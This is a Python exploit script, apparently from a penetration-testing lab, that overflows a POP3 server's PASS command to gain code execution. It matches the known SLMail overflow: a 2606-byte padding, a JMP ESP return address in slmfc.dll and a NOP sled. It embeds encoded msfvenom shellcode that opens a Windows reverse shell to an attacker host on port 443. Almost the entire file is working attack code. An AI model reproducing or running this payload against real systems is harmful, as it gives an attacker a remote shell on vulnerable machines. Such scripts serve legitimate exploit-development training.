#1/usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#msfvenom --payload windows/shell_reverse_tcp LHOST=10.11.0.176 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d'
#x86/shikata_ga_nai chosen with final size 351
#Final size of c file: 1500 bytes
shellcode = ("\xbb\xb0\xc1\xb9\x8e\xd9\xe8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x5e\x12\x03\x5e\x12\x83\x76\xc5\x5b\x7b\x8a\x2e\x19"
"\x84\x72\xaf\x7e\x0c\x97\x9e\xbe\x6a\xdc\xb1\x0e\xf8\xb0\x3d"
"\xe4\xac\x20\xb5\x88\x78\x47\x7e\x26\x5f\x66\x7f\x1b\xa3\xe9"
"\x03\x66\xf0\xc9\x3a\xa9\x05\x08\x7a\xd4\xe4\x58\xd3\x92\x5b"
"\x4c\x50\xee\x67\xe7\x2a\xfe\xef\x14\xfa\x01\xc1\x8b\x70\x58"
"\xc1\x2a\x54\xd0\x48\x34\xb9\xdd\x03\xcf\x09\xa9\x95\x19\x40"
"\x52\x39\x64\x6c\xa1\x43\xa1\x4b\x5a\x36\xdb\xaf\xe7\x41\x18"
"\xcd\x33\xc7\xba\x75\xb7\x7f\x66\x87\x14\x19\xed\x8b\xd1\x6d"
"\xa9\x8f\xe4\xa2\xc2\xb4\x6d\x45\x04\x3d\x35\x62\x80\x65\xed"
"\x0b\x91\xc3\x40\x33\xc1\xab\x3d\x91\x8a\x46\x29\xa8\xd1\x0e"
"\x9e\x81\xe9\xce\x88\x92\x9a\xfc\x17\x09\x34\x4d\xdf\x97\xc3"
"\xb2\xca\x60\x5b\x4d\xf5\x90\x72\x8a\xa1\xc0\xec\x3b\xca\x8a"
"\xec\xc4\x1f\x1c\xbc\x6a\xf0\xdd\x6c\xcb\xa0\xb5\x66\xc4\x9f"
"\xa6\x89\x0e\x88\x4d\x70\xd9\xbd\x9a\x7a\xa9\xaa\x9e\x7a\xc8"
"\x91\x16\x9c\xa0\xf5\x7e\x37\x5d\x6f\xdb\xc3\xfc\x70\xf1\xae"
"\x3f\xfa\xf6\x4f\xf1\x0b\x72\x43\x66\xfc\xc9\x39\x21\x03\xe4"
"\x55\xad\x96\x63\xa5\xb8\x8a\x3b\xf2\xed\x7d\x32\x96\x03\x27"
"\xec\x84\xd9\xb1\xd7\x0c\x06\x02\xd9\x8d\xcb\x3e\xfd\x9d\x15"
"\xbe\xb9\xc9\xc9\xe9\x17\xa7\xaf\x43\xd6\x11\x66\x3f\xb0\xf5"
"\xff\x73\x03\x83\xff\x59\xf5\x6b\xb1\x37\x40\x94\x7e\xd0\x44"
"\xed\x62\x40\xaa\x24\x27\x70\xe1\x64\x0e\x19\xac\xfd\x12\x44"
"\x4f\x28\x50\x71\xcc\xd8\x29\x86\xcc\xa9\x2c\xc2\x4a\x42\x5d"
"\x5b\x3f\x64\xf2\x5c\x6a")

#A up until EIP
#send EIP to a JMP ESP instruction in slmfc.dll
#8 bytes of nop
#lastly, out 351 byte shellcode
buffer = 'A' * 2606  + '\x8f\x35\x4a\x5f' + "\x90" * 8 + shellcode


try:
    print "Sending evil buffer..."
    s.connect(('10.11.23.10', 110))
    data = s.recv(1024)
    s.send('USER username + \r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print '\nDone!'
except:
    print 'something went wrong'
